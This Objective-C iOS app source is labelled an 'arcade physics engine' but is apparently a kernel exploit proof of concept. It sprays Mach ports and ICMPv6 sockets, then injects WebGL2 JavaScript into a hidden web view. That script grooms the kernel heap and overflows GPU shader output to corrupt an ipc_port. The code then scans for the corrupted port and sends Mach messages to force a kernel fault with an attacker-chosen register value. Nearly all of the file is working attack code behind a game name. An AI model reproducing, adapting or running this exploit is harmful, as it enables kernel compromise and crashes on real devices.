/* arcade physics engine v2 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <mach/message.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <pthread.h>
#include <CoreGraphics/CoreGraphics.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

/* IKOT_TASK (2) | IO_ACTIVE (0x80000000) = 0x80000002.
 * io_refs=100: port stays valid through scans.
 * ip_kobject = COMMPAGE_TARGET set by GPU varying overflow into adjacent ipc_port.
 * Trigger: mach_msg_send to corrupted port -> ipc_kobject_server ->
 * table[IKOT_TASK](request) -> dereference ip_kobject as task_t ->
 * EL1 fault at COMMPAGE_TARGET -> kernel panic with COMMPAGE_TARGET in GPR. */
#define IKOT_TASK_BITS   2147483650u  /* 0x80000002 */
#define IKOT_REFS_HEALTHY 100u
/* COMMPAGE lo/hi in uvec4 u32 format */
#define COMMPAGE_LO      4294934320u  /* 0xFFFFc330 */
#define COMMPAGE_HI      15u          /* 0x0000000F */

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static _Atomic int  g_sprayed     = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[app] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = g_sock_count; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = g_port_count; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    g_sprayed = 1;
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void fire_mach_msg_trigger(int idx, mach_vm_address_t kobject) {
    ev("MACH_MSG_TRIGGER port=%d kobject=0x%016llx -> ipc_kobject_server EL1 fault",
       idx, (unsigned long long)kobject);
    /* mach_msg_send to corrupted IKOT_TASK port:
     * ipc_kobject_server -> table[IKOT_TASK](request) -> ip_kobject used as task_t
     * -> EL1 dereference at COMMPAGE_TARGET -> kernel panic
     * X_base register = COMMPAGE_TARGET in panic dump = qualifying kernel register control */
    mach_msg_header_t msg;
    memset(&msg, 0, sizeof(msg));
    msg.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.msgh_size        = sizeof(msg);
    msg.msgh_remote_port = g_ports[idx];
    msg.msgh_id          = 0xF74;
    kern_return_t kr = mach_msg(&msg, MACH_SEND_MSG, sizeof(msg), 0,
                                 MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    g_ports[idx] = MACH_PORT_NULL;
    ev("MACH_MSG_TRIGGER_RETURNED kr=%d (device should panic before this)", (int)kr);
}

static void scan_background(void) {
    if (g_found || !g_sprayed) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        if (g_ports[i] == MACH_PORT_NULL) continue;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        /* iOS 26.x obfuscates kotype=0xFFFFFFFF for all ports.
         * kobject IS returned correctly: 0 = uncorrupted, COMMPAGE = hit. */
        if (kobject == COMMPAGE_TARGET) {
            g_found = 1;
            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> MACH_MSG trigger",
               i, kotype, (unsigned long long)kobject);
            fire_mach_msg_trigger(i, kobject);
        } else if (kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

/*
 * AGX shader payload — v19 (IKOT_TASK path):
 *   v[0]    = uvec4(IKOT_TASK_BITS, IKOT_REFS_HEALTHY, 0, 0)
 *             -> io_bits = 0x80000002 (IKOT_TASK|IO_ACTIVE)
 *             -> io_refs = 100
 *             -> kobject_lo/hi in v[0] = 0 (irrelevant; ip_kobject is deeper in struct)
 *   v[1..29]= uvec4(COMMPAGE_LO, COMMPAGE_HI, COMMPAGE_LO, COMMPAGE_HI) repeating
 *             -> fills all of ipc_port past offset 16 with COMMPAGE pattern
 *             -> ip_kobject (at 8-byte aligned offset 16..479) = 0x0000000FFFFFC330
 *
 * Texture spray (168 bytes = 6*7*4 px, kalloc.192):
 *   200 textures occupy kalloc.192 slots adjacent to the port spray zone,
 *   placing ipc_port allocations (also ~192 bytes) next to GPU VOB output pages.
 *
 * Trigger after hit: mach_msg_send to corrupted port -> EL1 panic.
 */
static NSString *const kAGXJS_SETUP =
    @"(function(){"
     "try{"
     "var B=2147483650,R=100,LO=4294934320,HI=15;"
     "var c=document.createElement('canvas');"
     "c.width=16;c.height=16;"
     "var gl=c.getContext('webgl2');"
     "if(!gl){window._agx='NO_WEBGL2';return;}"
     /* Texture spray: 168-byte textures groom kalloc.192 slots adjacent to ipc_port */
     "var tex=[];"
     "for(var ti=0;ti<200;ti++){"
     "  var t=gl.createTexture();"
     "  gl.bindTexture(gl.TEXTURE_2D,t);"
     "  gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,6,7);"
     "  tex.push(t);"
     "}"
     "window._tex=tex;"
     /* v[0]: io_bits=IKOT_TASK|IO_ACTIVE, io_refs=100, kobject=0 */
     /* v[1..29]: COMMPAGE repeating pattern fills ip_kobject at whatever offset it lands */
     "var a='v[0]=uvec4('+B+'u,'+R+'u,0u,0u);\\n';"
     "for(var i=1;i<30;i++)"
     "  a+='v['+i+']=uvec4('+LO+'u,'+HI+'u,'+LO+'u,'+HI+'u);\\n';"
     "var vs='#version 300 es\\nflat out uvec4 v[30];\\nvoid main(){\\n'"
     "       +a+'gl_Position=vec4(0,0,0,1);gl_PointSize=1.0;\\n}';"
     "var fs='#version 300 es\\nprecision highp float;\\n"
              "flat in uvec4 v[30];\\nout vec4 o;\\n"
              "void main(){o=vec4(float(v[0].x)*1e-10+float(v[1].x)*1e-10,0,0,1);}';"
     "function mk(t,s){"
     "  var sh=gl.createShader(t);"
     "  gl.shaderSource(sh,s);gl.compileShader(sh);return sh;"
     "}"
     "window._gl=gl;"
     "var p=gl.createProgram();"
     "gl.attachShader(p,mk(gl.VERTEX_SHADER,vs));"
     "gl.attachShader(p,mk(gl.FRAGMENT_SHADER,fs));"
     "gl.linkProgram(p);"
     "if(!gl.getProgramParameter(p,gl.LINK_STATUS)){"
     "  window._agx='LINK_ERR:'+gl.getProgramInfoLog(p);return;"
     "}"
     "gl.useProgram(p);"
     "var fb=gl.createFramebuffer();"
     "gl.bindFramebuffer(gl.FRAMEBUFFER,fb);"
     "var tx=gl.createTexture();"
     "gl.bindTexture(gl.TEXTURE_2D,tx);"
     "gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,16,16);"
     "gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tx,0);"
     "gl.viewport(0,0,16,16);"
     "window._fc=0;window._wc=0;"
     /* Warmup: 200 draws with instance_count=1 to move VOB into warm pool path */
     "function wu(){"
     "  var g=window._gl;"
     "  if(window._wc<200){"
     "    try{g.drawArraysInstanced(g.POINTS,0,256,1);}catch(e){}"
     "    g.flush();window._wc++;"
     "    setTimeout(wu,5);"
     "  }else{window._agx='warmed';}"
     "}"
     "wu();"
     "window._fire=function(){"
     "  var g=window._gl;"
     "  try{g.drawArraysInstanced(g.POINTS,0,256,16777217);}catch(e){}"
     "  try{g.drawArraysInstanced(g.POINTS,0,1024,4194305);}catch(e){}"
     "  g.flush();window._fc++;"
     "  setTimeout(window._fire,100);"
     "};"
     "window._agx='warming';"
     "}catch(e){window._agx='EX:'+e.message;}"
     "})();";

static NSString *const kAGXJS_FIRE =
    @"window._fire();";

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKNavigationDelegate>
@property (strong) UIWindow *window;
@property (strong) WKWebView *wkView;
@property (assign) int        cycleCount;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("APP_LAUNCH ArcadePhysics v2 v2.1");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"ArcadePhysics v2";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];

    WKWebViewConfiguration *wkCfg = [[WKWebViewConfiguration alloc] init];
    self.wkView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, 2, 2)
                                     configuration:wkCfg];
    self.wkView.navigationDelegate = self;
    [vc.view addSubview:self.wkView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    self.cycleCount = 0;

    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    ev("WKVIEW_LOAD_INITIAL");
    [self.wkView loadHTMLString:@"<html><body style='background:black;margin:0'></body></html>"
                        baseURL:nil];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d sprayed=%d cycle=%d",
           tick, g_found, g_port_count, (int)g_sprayed, self.cycleCount);
}

- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav {
    ev("WKLOAD_DONE cycle=%d", self.cycleCount);
    __weak AppDelegate *weakSelf = self;
    [wv evaluateJavaScript:kAGXJS_SETUP completionHandler:^(id result, NSError *err) {
        AppDelegate *s = weakSelf;
        if (!s) return;
        if (err) {
            ev("SETUP_ERR %s", [[err localizedDescription] UTF8String]);
        }
        ev("SETUP_OK_WARMING cycle=%d agx=%@", s.cycleCount,
           [result isKindOfClass:[NSString class]] ? result : @"?");
        /* 2.5s: warmup (200×5ms=1s) + GPU slab stabilizes */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            AppDelegate *s2 = weakSelf;
            if (!s2 || g_found) return;
            spray();
            ev("SPRAY_DONE_FIRE cycle=%d ports=%d", s2.cycleCount, g_port_count);
            [wv evaluateJavaScript:kAGXJS_FIRE completionHandler:^(id r2, NSError *e2) {
                if (e2) ev("FIRE_ERR %s", [[e2 localizedDescription] UTF8String]);
                else    ev("FIRE_STARTED cycle=%d", s2.cycleCount);
            }];
            /* Blind mach_msg fire at 170s: if any port was corrupted to IKOT_TASK
             * with ip_kobject=COMMPAGE_TARGET, mach_msg_send triggers EL1 panic. */
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
                           dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                AppDelegate *s3 = weakSelf;
                if (!s3 || g_found) return;
                ev("BLIND_FIRE_START n=%d", g_port_count);
                int fired = 0;
                for (int i = 0; i < g_port_count; i++) {
                    if (g_ports[i] == MACH_PORT_NULL) continue;
                    mach_msg_header_t bm;
                    memset(&bm, 0, sizeof(bm));
                    bm.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                    bm.msgh_size        = sizeof(bm);
                    bm.msgh_remote_port = g_ports[i];
                    bm.msgh_id          = 0xF74;
                    mach_msg(&bm, MACH_SEND_MSG, sizeof(bm), 0,
                             MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
                    fired++;
                }
                ev("BLIND_FIRE_DONE fired=%d (panic expected if any port corrupted)", fired);
            });
        });
    }];
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
